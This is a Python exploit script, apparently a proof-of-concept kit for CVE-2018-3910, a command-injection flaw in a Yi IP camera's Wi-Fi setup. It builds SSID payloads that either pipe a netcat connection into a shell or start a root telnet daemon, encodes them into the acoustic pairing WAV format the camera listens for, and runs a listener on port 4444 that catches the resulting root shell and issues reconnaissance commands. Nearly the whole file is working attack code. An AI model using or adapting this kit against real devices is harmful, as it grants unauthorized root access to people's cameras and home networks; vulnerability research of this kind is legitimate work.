#!/usr/bin/env python3
"""Yi IPC (Zowee, 192.168.6.156) CVE-2018-3910 proving kit — no card, no cable.

The camera's `cloud` builds `popen("/home/app/cloudAPI ... -ssid \\"%s\\"")` and does not escape the
SSID, so `$( )` and `|` are expanded by `sh -c` on the root side. The SSID is chosen through the
app's Wi-Fi field and 802.11 caps it at 32 octets.

The app delivers it by sound (`libpcmjni.so` `genPcmData`), so this file also carries a bit-exact
reimplementation of that encoder — the app is not required to run the test.

  yi_u1.py serve [host]        listener on 4444, logs to /tmp/yi_listener.log, sends `id` on connect
  yi_u1.py wav BINDKEY SSID PWD OUT.wav
  yi_u1.py decode IN.wav       verify a WAV (header, payload, RS parity)
  yi_u1.py payloads            print the payloads and their octet counts

Payloads (802.11 caps SSID at 32 octets):
  primary  x$(nc <host> 4444|sh)                28 octets
  fallback x";telnetd -l/bin/sh;#               22 octets

Protocol (recovered from libpcmjni.so, armeabi-v7a):
  16 kHz mono 16-bit WAV, 1024-sample symbols
  2 header symbols (low=10, mid=4, high=10)
  payload = bindkey "\\n" ssid "\\n" pwd, prefixed by a length byte (< 128)
  10 data bytes + 8 Reed-Solomon parity (RS(255,247), poly 0x11d, fcr=1) per block
  each byte -> 3 simultaneous tones: low nibble (16), symbol-index&3 (4), high nibble (16)
  bin = 2*(100+3*low), 2*(153+3*mid), 2*(173+3*high); amplitude 5461.33 per bin,
  unscaled inverse FFT -> 2*A per bin, truncated to int16
"""
import math
import socket
import struct
import sys
import threading
import wave

HOST = "192.168.4.160"
PORT = 4444
LOG = "/tmp/yi_listener.log"

PRIMARY = "x$(" + f"nc {HOST} {PORT}" + "|sh)"
FALLBACK = 'x";telnetd -l/bin/sh;#'

N = 1024
SR = 16000
A = 5461.33
HDR = (10, 4, 10)

EXP = [0] * 512
LOG_GF = [0] * 256
_x = 1
for _i in range(255):
    EXP[_i] = _x
    LOG_GF[_x] = _i
    _x <<= 1
    if _x & 0x100:
        _x ^= 0x11D
for _i in range(255, 512):
    EXP[_i] = EXP[_i - 255]


def gmul(a, b):
    if a == 0 or b == 0:
        return 0
    return EXP[LOG_GF[a] + LOG_GF[b]]


def gen_poly(nroots, fcr):
    g = [1]
    for i in range(nroots):
        root = EXP[fcr + i]
        ng = [0] * (len(g) + 1)
        for j, c in enumerate(g):
            ng[j] ^= c
            ng[j + 1] ^= gmul(c, root)
        g = ng
    return g


GEN = gen_poly(8, 1)


def rs_parity(data):
    buf = list(data) + [0] * 8
    for i in range(len(data)):
        coef = buf[i]
        if coef:
            for j in range(1, len(GEN)):
                buf[i + j] ^= gmul(GEN[j], coef)
    return buf[len(data):]


def chirp(low, mid, high):
    bins = (2 * (100 + 3 * low), 2 * (153 + 3 * mid), 2 * (173 + 3 * high))
    out = []
    for n in range(N):
        s = 0.0
        for k in bins:
            s += 2.0 * A * math.cos(2.0 * math.pi * k * n / N)
        out.append(int(s))
    return out


def encode(payload: bytes):
    if len(payload) >= 128:
        raise SystemExit("payload >= 128 bytes")
    buf = bytes([len(payload)]) + payload
    blocks = (len(buf) + 9) // 10
    buf += b"\x00" * (blocks * 10 - len(buf))
    samples = []
    for _ in range(2):
        samples += chirp(*HDR)
    k = 0
    for b in range(blocks):
        blk = buf[b * 10:(b + 1) * 10]
        for byte in blk + bytes(rs_parity(blk)):
            samples += chirp(byte & 0x0F, k & 3, byte >> 4)
            k += 1
    return samples


def write_wav(path, samples):
    with wave.open(path, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(SR)
        w.writeframes(b"".join(struct.pack("<h", max(-32768, min(32767, s))) for s in samples))


def goertzel(block, k):
    w = 2.0 * math.pi * k / N
    c = 2.0 * math.cos(w)
    s1 = s2 = 0.0
    for x in block:
        s0 = x + c * s1 - s2
        s2, s1 = s1, s0
    return s1 * s1 + s2 * s2 - c * s1 * s2


def pick(block, base, count):
    vals = [goertzel(block, 2 * (base + 3 * i)) for i in range(count)]
    return max(range(count), key=lambda i: vals[i])


def decode(path):
    with wave.open(path, "rb") as w:
        raw = w.readframes(w.getnframes())
    s = struct.unpack("<%dh" % (len(raw) // 2), raw)
    syms = [s[i:i + N] for i in range(0, len(s) - N + 1, N)]
    hdr = [(pick(b, 100, 16), pick(b, 153, 5), pick(b, 173, 16)) for b in syms[:2]]
    print("header", hdr)
    out = bytearray()
    for i, b in enumerate(syms[2:]):
        lo = pick(b, 100, 16)
        mid = pick(b, 153, 5)
        hi = pick(b, 173, 16)
        if mid != i % 4:
            print(f"sync mismatch at {i}: {mid} != {i % 4}")
        out.append((hi << 4) | lo)
    data = bytearray()
    bad = 0
    for b in range(len(out) // 18):
        blk = out[b * 18:b * 18 + 10]
        par = out[b * 18 + 10:b * 18 + 18]
        data += blk
        if bytes(rs_parity(blk)) != bytes(par):
            bad += 1
    n = data[0]
    print("len", n, "payload", bytes(data[1:1 + n]))
    print("rs blocks", len(out) // 18, "bad", bad)


def serve(host: str = HOST, port: int = PORT) -> None:
    logf = open(LOG, "a", buffering=1)

    def log(msg):
        print(msg, flush=True)
        logf.write(msg + "\n")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(4)
    log(f"listening on {host}:{port}")
    while True:
        conn, addr = srv.accept()
        log(f"shell from {addr}")
        conn.sendall(b"id; uname -a; cat /proc/cmdline\n")

        def pump(src, dst):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.write(data)
                    dst.flush()
            except OSError:
                pass

        if sys.stdin.isatty():
            threading.Thread(target=pump, args=(sys.stdin.buffer, conn), daemon=True).start()
        else:
            log("(non-tty stdin: device output is logged only)")
        pump(conn, logf)
        log("shell closed")


def main() -> int:
    cmd = sys.argv[1] if len(sys.argv) > 1 else ""
    if cmd == "payloads":
        for name, p in (("primary", PRIMARY), ("fallback", FALLBACK)):
            print(f"{name}: {len(p)} octets  {p!r}  fits={len(p) <= 32}")
        return 0
    if cmd == "serve":
        serve(*(sys.argv[2:4]))
        return 0
    if cmd == "wav" and len(sys.argv) == 6:
        payload = f"{sys.argv[2]}\n{sys.argv[3]}\n{sys.argv[4]}".encode()
        print("payload", len(payload), payload)
        write_wav(sys.argv[5], encode(payload))
        print("wrote", sys.argv[5])
        return 0
    if cmd == "decode" and len(sys.argv) == 3:
        decode(sys.argv[2])
        return 0
    print(__doc__)
    return 0 if not cmd else 2


if __name__ == "__main__":
    sys.exit(main())
